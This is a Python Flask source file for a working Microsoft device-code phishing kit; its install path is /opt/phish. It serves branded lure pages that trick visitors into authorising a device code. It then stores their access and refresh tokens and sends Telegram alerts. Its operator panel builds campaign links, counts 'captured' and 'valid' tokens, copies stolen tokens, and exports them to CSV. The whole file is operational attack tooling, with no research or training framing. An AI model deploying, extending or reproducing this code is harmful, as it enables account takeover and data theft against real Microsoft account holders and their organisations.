from flask import (Flask, request, jsonify, render_template_string, Response)
from urllib.parse import quote
import os, re, subprocess, tempfile, threading, time

import db
from oauth import request_device_code
from worker import spawn, resume_pending
from templates_registry import get as get_template, TEMPLATES
from exporter import fetch as ex_fetch, to_csv_string
import config as _config
from config import PUBLIC_BASE, OPERATOR_TOKEN, LURE_KEY

app = Flask(__name__)
db.init()
resume_pending()

CONFIG_PATH = "/opt/phish/config.py"

def _deferred_restart():
    threading.Timer(0.75, lambda: subprocess.Popen(
        ["systemctl", "restart", "phish"],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)).start()

def _atomic_write(path, text):
    d = os.path.dirname(path)
    tmp = None
    try:
        with tempfile.NamedTemporaryFile("w", dir=d, delete=False) as tf:
            tf.write(text); tmp = tf.name
        os.replace(tmp, path)
    finally:
        if tmp and os.path.exists(tmp):
            try: os.unlink(tmp)
            except Exception: pass

def _client_ip():
    return (request.headers.get("CF-Connecting-IP")
            or request.headers.get("X-Real-IP")
            or request.headers.get("X-Forwarded-For", "").split(",")[0].strip()
            or request.remote_addr)

@app.route("/")
def landing():
    if LURE_KEY and request.args.get("k", "") != LURE_KEY:
        return ("Not Found", 404)
    tid = request.args.get("t", "teams")
    cid = request.args.get("c", "")
    tpl = get_template(tid)
    return render_template_string(PAGE_HTML, tpl=tpl, tid=tid, cid=cid)

@app.route("/api/new", methods=["POST"])
def api_new():
    if LURE_KEY and request.args.get("k", "") != LURE_KEY:
        return jsonify({"error": "not found"}), 404
    payload = request.get_json(silent=True) or {}
    tid = payload.get("t", request.form.get("t", "teams"))
    cid = payload.get("c", request.form.get("c", ""))
    flow = request_device_code()
    now  = int(time.time())
    with db.conn() as c:
        c.execute("""INSERT OR REPLACE INTO sessions
                     (user_code, device_code, template, campaign,
                      remote_ip, user_agent, created_at, expires_at, client_mode)
                     VALUES (?,?,?,?,?,?,?,?,?)""",
                  (flow["user_code"], flow["device_code"], tid, cid,
                   _client_ip(),
                   request.headers.get("User-Agent", ""),
                   now, now + flow.get("expires_in", 900),
                   _config.MODE))
    spawn(flow["user_code"], flow["device_code"],
          flow.get("interval", 5), flow.get("expires_in", 900))
    try:
        from telegram import notify_visitor
        notify_visitor(flow["user_code"], tid, cid, _client_ip())
    except Exception:
        pass
    return jsonify({
        "user_code": flow["user_code"],
        "expires_in": flow.get("expires_in", 900),
        "verification_uri": flow.get("verification_uri",
                                     "https://microsoft.com/devicelogin"),
    })

@app.route("/api/status/<user_code>")
def api_status(user_code):
    with db.conn() as c:
        row = c.execute("SELECT status, upn FROM sessions WHERE user_code=?",
                        (user_code,)).fetchone()
    if not row:
        return jsonify({"error": "unknown"}), 404
    return jsonify({"status": row["status"], "upn": row["upn"]})

def _auth():
    import hmac
    supplied = request.headers.get("X-Operator-Token", "")
    return hmac.compare_digest(supplied, OPERATOR_TOKEN)

@app.route("/op")
def op_panel():
    return render_template_string(PANEL_HTML)

@app.route("/op/stats")
def op_stats():
    if not _auth(): return jsonify({"error":"unauth"}), 401
    with db.conn() as c:
        counts = dict(c.execute(
            "SELECT status, COUNT(*) FROM sessions GROUP BY status").fetchall())
        visitors = c.execute("SELECT COUNT(*) FROM sessions").fetchone()[0]
        valid = c.execute("""SELECT COUNT(*) FROM sessions
                             WHERE status='success' AND validation='valid'""").fetchone()[0]
    return jsonify({
        "visitors": visitors,
        "pending":  counts.get("pending", 0),
        "captured": counts.get("success", 0),
        "valid":    valid,
    })

@app.route("/op/recent")
def op_recent():
    if not _auth(): return jsonify({"error":"unauth"}), 401
    with db.conn() as c:
        rows = c.execute("""SELECT user_code, upn, template, campaign,
                                   client_mode, remote_ip, status, created_at
                            FROM sessions ORDER BY id DESC LIMIT 100""").fetchall()
    return jsonify([dict(r) for r in rows])

@app.route("/op/sessions/<user_code>/token")
def op_token(user_code):
    if not _auth(): return jsonify({"error":"unauth"}), 401
    with db.conn() as c:
        r = c.execute("""SELECT access_token, refresh_token, upn, status
                         FROM sessions WHERE user_code=?""", (user_code,)).fetchone()
    return jsonify(dict(r) if r else {})

@app.route("/op/templates")
def op_templates():
    if not _auth(): return jsonify({"error":"unauth"}), 401
    return jsonify({k: {"name": v["name"]} for k, v in TEMPLATES.items()})

@app.route("/op/generate", methods=["POST"])
def op_generate():
    if not _auth(): return jsonify({"error":"unauth"}), 401
    data = request.get_json(force=True)
    tid = data.get("template", "teams")
    cid = data.get("campaign", "")
    k = f"&k={quote(LURE_KEY)}" if LURE_KEY else ""
    return jsonify({"url": f"{PUBLIC_BASE}/?t={quote(tid)}&c={quote(cid)}{k}"})

@app.route("/op/clear-pending", methods=["POST"])
def op_clear_pending():
    if not _auth(): return jsonify({"error":"unauth"}), 401
    with db.conn() as c:
        c.execute("""DELETE FROM sessions
                     WHERE status='pending' AND expires_at < ?""",
                  (int(time.time()),))
    return jsonify({"ok": True})

@app.route("/op/delete-all", methods=["POST"])
def op_delete_all():
    if not _auth(): return jsonify({"error":"unauth"}), 401
    with db.conn() as c:
        c.execute("""DELETE FROM sessions
                     WHERE status IN ('expired','error','expired_token',
                                      'authorization_declined',
                                      'bad_verification_code')
                        OR (status='pending' AND expires_at < ?)""",
                  (int(time.time()),))
    return jsonify({"ok": True})

@app.route("/op/export.csv")
def op_export_csv():
    if not _auth(): return jsonify({"error":"unauth"}), 401
    rows = ex_fetch(
        status=request.args.get("status"),
        campaign=request.args.get("campaign"),
        since_seconds=request.args.get("since", type=int),
        only_valid=request.args.get("valid") == "1",
    )
    csv_data = to_csv_string(rows)
    fname = f"captures_{int(time.time())}.csv"
    return Response(
        csv_data,
        mimetype="text/csv",
        headers={"Content-Disposition": f"attachment; filename={fname}"},
    )

@app.route("/op/telegram", methods=["GET", "POST"])
def op_telegram():
    if not _auth(): return jsonify({"error":"unauth"}), 401
    if request.method == "GET":
        from config import TELEGRAM_ENABLED, TELEGRAM_TOKEN, TELEGRAM_CHAT_ID
        return jsonify({"enabled": bool(TELEGRAM_ENABLED),
                        "token": TELEGRAM_TOKEN, "chat_id": TELEGRAM_CHAT_ID})
    data = request.get_json(force=True)
    enabled = bool(data.get("enabled", True))
    token   = str(data.get("token", "")).strip()
    chat_id = str(data.get("chat_id", "")).strip()
    try:
        with open(CONFIG_PATH) as f: src = f.read()
        tok_esc  = token.replace('\\','\\\\').replace('"','\\"')
        chat_esc = chat_id.replace('\\','\\\\').replace('"','\\"')
        src = re.sub(r"^TELEGRAM_ENABLED\s*=.*$", f"TELEGRAM_ENABLED = {enabled}", src, flags=re.M)
        src = re.sub(r"^TELEGRAM_TOKEN\s*=.*$",   f'TELEGRAM_TOKEN   = "{tok_esc}"', src, flags=re.M)
        src = re.sub(r"^TELEGRAM_CHAT_ID\s*=.*$", f'TELEGRAM_CHAT_ID = "{chat_esc}"', src, flags=re.M)
        _atomic_write(CONFIG_PATH, src)
        _deferred_restart()
        return jsonify({"ok": True, "restart": "queued"})
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)}), 500

@app.route("/op/telegram/test", methods=["POST"])
def op_telegram_test():
    if not _auth(): return jsonify({"error":"unauth"}), 401
    try:
        from telegram import _send
        ok = _send("panel test ✅")
        return jsonify({"sent": bool(ok)})
    except Exception as e:
        return jsonify({"sent": False, "error": str(e)}), 500

@app.route("/op/mode", methods=["GET", "POST"])
def op_mode():
    if not _auth(): return jsonify({"error":"unauth"}), 401
    if request.method == "GET":
        import config as _c
        return jsonify({
            "mode": getattr(_c, "MODE", "personal"),
            "custom_available": bool(getattr(_c, "CLIENT_ID_CUSTOM", "")),
        })
    data = request.get_json(force=True)
    mode = str(data.get("mode", "personal")).strip()
    if mode not in ("personal", "work", "custom"):
        return jsonify({"ok": False, "error": "mode must be personal, work, or custom"}), 400
    if mode == "custom" and not getattr(_config, "CLIENT_ID_CUSTOM", ""):
        return jsonify({"ok": False, "error": "CLIENT_ID_CUSTOM is empty in config.py"}), 400
    try:
        with open(CONFIG_PATH) as f: src = f.read()
        src = re.sub(r'^MODE\s*=.*$', f'MODE = "{mode}"', src, flags=re.M)
        _atomic_write(CONFIG_PATH, src)
        _deferred_restart()
        return jsonify({"ok": True, "mode": mode, "restart": "queued"})
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)}), 500

PAGE_HTML = r"""<!doctype html>
<html lang="en"><head><meta charset="utf-8">
<title>Verify your identity</title>
<link rel="stylesheet" href="/static/style.css">
<style>:root { --accent: {{ tpl.accent }}; }</style></head>
<body><div class="wrap">
  <header><img src="{{ tpl.logo }}" height="36"><span>{{ tpl.header }}</span></header>
  <div class="card">
    <div class="shield">🔒</div>
    <h1>Verify your identity</h1>
    <p>To access this {{ tpl.noun }}, please complete verification with Microsoft.</p>
    <div class="waiting" id="waiting">⏳ Waiting for authentication…</div>
    <div class="label">YOUR VERIFICATION CODE</div>
    <div class="code" id="code">······</div>
    <button class="copy" onclick="copyCode()">📋 Copy Code</button>
    <div class="expiry" id="expiry">Code expires in --:--</div>
    <ol><li>Copy the code above.</li><li>Click continue and paste (Ctrl+V).</li>
      <li>Sign in with your Microsoft account.</li></ol>
    <a class="cta" href="https://microsoft.com/devicelogin" target="_blank">Continue to Microsoft</a>
  </div>
</div>
<script>const TPL = {{ tid|tojson }}, CAMP = {{ cid|tojson }};</script>
<script src="/static/app.js?v=3"></script>
</body></html>"""

PANEL_HTML = r"""<!doctype html>
<html lang="en"><head><meta charset="utf-8"><title>Panel</title>
<style>
body{font-family:"Segoe UI",system-ui,sans-serif;background:#0b1220;color:#d7e2f1;margin:0;padding:24px}
h1{font-size:20px;margin:0 0 20px}
.section{background:#111c30;border:1px solid #1e2c47;border-radius:8px;padding:20px;margin-bottom:20px}
.section h2{font-size:14px;margin:0 0 14px;color:#7ba0d1;text-transform:uppercase;letter-spacing:1px}
input,select{background:#0b1220;color:#d7e2f1;border:1px solid #2a3a55;border-radius:4px;padding:8px 10px;font-family:inherit;font-size:13px}
button{background:#2563eb;color:#fff;border:none;padding:9px 18px;border-radius:4px;cursor:pointer;font-weight:600;font-size:13px}
button.danger{background:#7f1d1d}button.ghost{background:#1e3a8a}
.row{display:flex;gap:10px;margin-bottom:12px;flex-wrap:wrap;align-items:center}
.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:12px}
.stat{background:#0b1220;border-left:3px solid #2563eb;border-radius:4px;padding:14px}
.stat .n{font-size:28px;font-weight:700}
.stat .l{font-size:11px;color:#7ba0d1;text-transform:uppercase;letter-spacing:1px;margin-top:4px}
table{width:100%;border-collapse:collapse;font-size:12px}
th{text-align:left;padding:8px;color:#7ba0d1;border-bottom:1px solid #1e2c47;font-weight:600;font-size:11px;text-transform:uppercase}
td{padding:8px;border-bottom:1px solid #16233a}
tr:hover{background:#16233a;cursor:pointer}
.status-success{color:#4ade80}.status-pending{color:#fbbf24}
.status-expired,.status-declined,.status-error{color:#94a3b8}
</style></head><body>
<h1>Device Code Panel</h1>

<div class="section"><h2>Operator token</h2>
<div class="row"><input id="token" type="password" placeholder="Paste operator token" style="flex:1">
<button onclick="saveToken()">Save</button></div></div>

<div class="section"><h2>Capture mode</h2><div class="row">
<label style="display:flex;align-items:center;gap:6px"><input type="radio" name="mode" value="personal"> Personal</label>
<label style="display:flex;align-items:center;gap:6px"><input type="radio" name="mode" value="work"> Work</label>
<label style="display:flex;align-items:center;gap:6px"><input type="radio" name="mode" value="custom"> Custom</label>
<button onclick="saveMode()">Save</button>
<span id="mode-info" style="font-size:12px;color:#7ba0d1"></span></div></div>

<div class="section"><h2>Telegram settings</h2>
<div class="row"><label style="display:flex;align-items:center;gap:6px"><input type="checkbox" id="tg-enabled"> Enabled</label></div>
<div class="row"><input id="tg-token" type="password" placeholder="Bot token" style="flex:1"></div>
<div class="row"><input id="tg-chat" placeholder="Chat ID" style="flex:1">
<button onclick="saveTelegram()">Save & Restart</button>
<button class="ghost" onclick="testTelegram()">Send test</button></div></div>

<div class="section"><h2>Generate shareable link</h2>
<div class="row"><select id="tpl"></select>
<input id="camp" placeholder="Campaign" style="flex:1">
<button onclick="genLink()">Copy Link</button></div>
<div class="row"><input id="link" placeholder="Generated link" readonly style="flex:1"></div></div>

<div class="section"><h2>Live stats</h2><div class="stats">
<div class="stat"><div class="n" id="s-visitors">0</div><div class="l">Visitors</div></div>
<div class="stat"><div class="n" id="s-pending">0</div><div class="l">Pending</div></div>
<div class="stat"><div class="n" id="s-captured">0</div><div class="l">Captured</div></div>
<div class="stat"><div class="n" id="s-valid">0</div><div class="l">Valid Tokens</div></div>
</div></div>

<div class="section"><h2>Export</h2><div class="row">
<button class="ghost" onclick="exportCSV()">All</button>
<button class="ghost" onclick="exportCSV('success')">Captured</button>
<button class="ghost" onclick="exportCSV(null,null,null,true)">Valid only</button>
</div></div>

<div class="section"><h2>Recent</h2><div class="row">
<button class="ghost" onclick="loadRecent()">Refresh</button>
<button class="danger" onclick="clearPending()">Clear Pending</button>
<button class="danger" onclick="deleteAll()">Clean Dead Rows</button>
</div>
<table><thead><tr><th>Code</th><th>UPN</th><th>Template</th><th>Campaign</th><th>Mode</th><th>IP</th><th>Status</th><th>Time</th></tr></thead>
<tbody id="rows"></tbody></table></div>

<script>
const $=id=>document.getElementById(id);
function saveToken(){localStorage.setItem("op_token",$("token").value);alert("Saved.")}
function token(){return localStorage.getItem("op_token")||""}
async function api(p,o={}){o.headers=Object.assign({},o.headers||{},{"X-Operator-Token":token()});
if(o.body&&!o.headers["Content-Type"])o.headers["Content-Type"]="application/json";
const r=await fetch(p,o);if(!r.ok)throw new Error("HTTP "+r.status);return r.json()}
async function loadTemplates(){try{const t=await api("/op/templates");
$("tpl").innerHTML=Object.entries(t).map(([k,v])=>`<option value="${k}">${v.name}</option>`).join("")}catch(_){}}
async function genLink(){try{const d=await api("/op/generate",{method:"POST",
body:JSON.stringify({template:$("tpl").value,campaign:$("camp").value})});
$("link").value=d.url;await navigator.clipboard.writeText(d.url);alert("Link copied")}catch(e){alert("Failed: "+e.message)}}
async function loadStats(){try{const s=await api("/op/stats");
$("s-visitors").textContent=s.visitors;$("s-pending").textContent=s.pending;
$("s-captured").textContent=s.captured;$("s-valid").textContent=s.valid}catch(_){}}
async function loadRecent(){try{const rows=await api("/op/recent");
$("rows").innerHTML=rows.map(r=>`<tr onclick="showToken('${r.user_code}')">
<td>${r.user_code}</td><td>${r.upn||""}</td><td>${r.template||""}</td>
<td>${r.campaign||""}</td><td>${r.client_mode||""}</td><td>${r.remote_ip||""}</td>
<td class="status-${r.status}">${r.status}</td>
<td>${new Date(r.created_at*1000).toLocaleTimeString()}</td></tr>`).join("")}catch(_){}}
async function showToken(code){try{const d=await api("/op/sessions/"+code+"/token");
if(!d.access_token){alert("No token yet.");return}
const blob="UPN: "+d.upn+"\n\nACCESS:\n"+d.access_token+"\n\nREFRESH:\n"+d.refresh_token;
await navigator.clipboard.writeText(blob);
alert("Copied tokens for "+(d.upn||code))}catch(e){alert("Failed: "+e.message)}}
async function clearPending(){if(!confirm("Delete stale pending?"))return;
try{await api("/op/clear-pending",{method:"POST"});loadRecent();loadStats()}catch(e){alert(e.message)}}
async function deleteAll(){if(!confirm("Delete dead rows only? Successful captures are kept."))return;
try{await api("/op/delete-all",{method:"POST"});loadRecent();loadStats()}catch(e){alert(e.message)}}
async function exportCSV(status=null,campaign=null,since=null,validOnly=false){
const p=new URLSearchParams();if(status)p.set("status",status);if(campaign)p.set("campaign",campaign);
if(since)p.set("since",since);if(validOnly)p.set("valid","1");
const r=await fetch("/op/export.csv?"+p.toString(),{headers:{"X-Operator-Token":token()}});
if(!r.ok){alert("Export failed");return}const blob=await r.blob();const a=document.createElement("a");
a.href=URL.createObjectURL(blob);a.download="captures_"+Date.now()+".csv";
document.body.appendChild(a);a.click();a.remove()}
async function loadTelegram(){try{const d=await api("/op/telegram");
$("tg-enabled").checked=!!d.enabled;$("tg-token").value=d.token||"";$("tg-chat").value=d.chat_id||""}catch(_){}}
async function saveTelegram(){const body=JSON.stringify({enabled:$("tg-enabled").checked,
token:$("tg-token").value.trim(),chat_id:$("tg-chat").value.trim()});
try{await api("/op/telegram",{method:"POST",body});alert("Saved. Reload in 5s.");
setTimeout(()=>location.reload(),5000)}catch(e){alert("Failed: "+e.message)}}
async function testTelegram(){try{const d=await api("/op/telegram/test",{method:"POST"});
alert(d.sent?"Test sent":"Send test failed")}catch(e){alert("Failed: "+e.message)}}
async function loadMode(){try{const d=await api("/op/mode");let checked=false;
document.querySelectorAll("input[name=mode]").forEach(r=>{
const dis=(r.value==="custom"&&!d.custom_available);r.disabled=dis;
r.checked=(r.value===d.mode)&&!dis;if(r.checked)checked=true});
if(!checked){const first=document.querySelector("input[name=mode]:not(:disabled)");if(first)first.checked=true}
$("mode-info").textContent="current: "+d.mode}catch(_){}}
async function saveMode(){const v=document.querySelector("input[name=mode]:checked");
if(!v){alert("Pick a mode");return}
try{await api("/op/mode",{method:"POST",body:JSON.stringify({mode:v.value})});
alert("Saved. Reload in 5s.");setTimeout(()=>location.reload(),5000)}catch(e){alert("Failed: "+e.message)}}
loadTemplates();loadStats();loadRecent();loadTelegram();loadMode();
setInterval(loadStats,5000);setInterval(loadRecent,10000);
</script></body></html>"""

if __name__ == "__main__":
    from waitress import serve
    serve(app, host="127.0.0.1", port=5000, threads=8)